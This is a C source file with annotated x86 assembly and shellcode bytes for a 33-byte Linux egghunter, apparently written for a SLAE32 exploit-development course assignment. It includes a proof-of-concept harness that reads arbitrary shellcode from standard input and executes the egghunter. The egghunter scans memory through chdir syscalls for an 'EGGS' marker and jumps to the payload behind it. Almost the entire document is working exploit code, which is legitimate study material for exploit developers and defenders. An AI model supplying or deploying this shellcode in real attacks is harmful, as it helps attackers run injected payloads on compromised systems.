/*
; Title: Linux x86 Egghunter shellcode (33 bytes)
; Author:  Mark Shaneck
; Website:  http://markshaneck.com
; Date: 8/20/2017
;
; A more detailed description of this code can be found at
; http://markshaneck.com/SLAE32/slae32-assignment3
;
; Description: Egg hunter: Find shellcode located somewhere
; in memory that is prepended with a "EGGS", using
; chdir syscall to determine valid memory access

global _start

section .text
_start:
	; put FGGS into the register then decrement
	; so it contains EGGS, so that we only need
	; one copy of the egg
	mov esi, 0x53474746
	dec esi

	; Save the syscall for chdir in ecx
	xor ecx,ecx
	mov cl, 12

	; we don't care what edx starts at, as it will wrap around
	; and eventually hit all memory addresses
align_page:
	; align edx to page boundary
	or dx,0xfff

nextaddr:
	inc edx
	lea ebx, [edx+0x4] ; check 4 bytes later
	mov eax,ecx ; Put chdir syscall number in eax
	int 0x80   ; call chdir

	; If return value is 0xf2, go to the next page
	cmp al,0xf2
	je align_page

	; if it gets here then the memory address is valid
	; so we can check if "EGGS" is there
	cmp esi, dword [edx]

	; If comparison fails, jump to next addr
	jne nextaddr

	; Otherwise jump to the shellcode pointed at by ebx
  ; Since "EGGS" is executable, we can jump right to it
	jmp ebx
*/

// Assumptions for below PoC code: Valid x86 shellcode must be
// sent to this program over STDIN and must be prepended with
// egg value "EGGS"

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

char egghunter[]=\
"\xbe\x46\x47\x47\x53\x4e\x31\xc9\xb1\x0c"
"\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x89"
"\xc8\xcd\x80\x3c\xf2\x74\xef\x3b\x32\x75"
"\xf0\xff\xe3";

int main(){
    char *shellcode = (char *)malloc(2048);
    int payload_len = read(0, shellcode, 2048);
    if (payload_len <= 0){
        printf("Please enter some shellcode into STDIN.\n");
        exit(1);
    }
    printf("Shellcode Length:  %d\n", strlen(shellcode));
    printf("Egg Hunter length: %d\n", strlen(egghunter));
    int (*ret)() = (int(*)())egghunter;
    ret();
}
